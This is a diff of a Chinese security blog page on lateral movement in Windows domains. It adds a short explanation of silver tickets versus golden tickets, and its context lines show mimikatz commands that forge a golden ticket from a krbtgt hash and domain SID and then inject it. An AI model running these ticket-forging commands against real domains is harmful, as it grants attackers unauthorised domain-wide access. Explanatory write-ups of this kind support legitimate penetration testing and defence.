@@ -37,7 +37,7 @@
 <meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-8.png">
 <meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-9.png">
 <meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-10.png">
-<meta property="og:updated_time" content="2018-10-22T08:59:50.325Z">
+<meta property="og:updated_time" content="2018-10-23T02:37:24.270Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="域渗透之横向移动">
 <meta name="twitter:description" content="域渗透之横向移动最近在根据ATT&amp;amp;CK提供的攻击矩阵梳理一些手法，趁着这个机会把自己的知识梳理一下，今天写一下横向移动常见的攻击手法。在攻击过程中，尽量不使用msf等集成攻击框架,尽量会把我理解的横向移动的手法总结全面。文章持久更新。">
@@ -271,6 +271,7 @@
 <p>先登录域控制器，dump krbtgt用户的hash值,获取域sid：<br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-6.png" alt=""><br>切换到普通域用户的机器，生成tgt凭证,用户名为administrator:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::golden</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:administrator</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:test.local</span> /<span class="selector-tag">sid</span><span class="selector-pseudo">:S-1-5-21-4173655609-916892889-516531421</span> /<span class="selector-tag">krbtgt</span><span class="selector-pseudo">:4c7f31c8a46406c43c397d5b6223ff27</span> /<span class="selector-tag">ticket</span><span class="selector-pseudo">:test.kirbi</span></div></pre></td></tr></table></figure></p>
 <p><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-7.png" alt=""><br>然后使用mimi将凭证注入进去,攻击成功:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mimikatz # kerberos::ptt test.kirbi</div></pre></td></tr></table></figure></p>
 <p><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-8.png" alt=""><br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-9.png" alt=""><br>使用wmic.vbs进行登录：<br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-10.png" alt=""></p>
+<h3 id="silver-ticket"><a href="#silver-ticket" class="headerlink" title="silver ticket"></a>silver ticket</h3><p>silver ticket和golden ticket不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。<br>不像是Golden ticket，是由krgtgt用户的密码hash进行加密，伪造tgt可以获取到所有权限。</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
 <li><a href="https://www.anquanke.com/post/id/159959" target="_blank" rel="external">https://www.anquanke.com/post/id/159959</a></li>
 <li><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/" target="_blank" rel="external">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</a></li>
@@ -397,15 +398,6 @@
 
   
 <nav id="article-nav">
-  
-    <a href="/2018/10/22/域渗透之横向移动/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          (no title)
-        
-      </div>
-    </a>
   
   
     <a href="/2018/07/23/windows后门种植方式收集/" id="article-nav-older" class="article-nav-link-wrap">
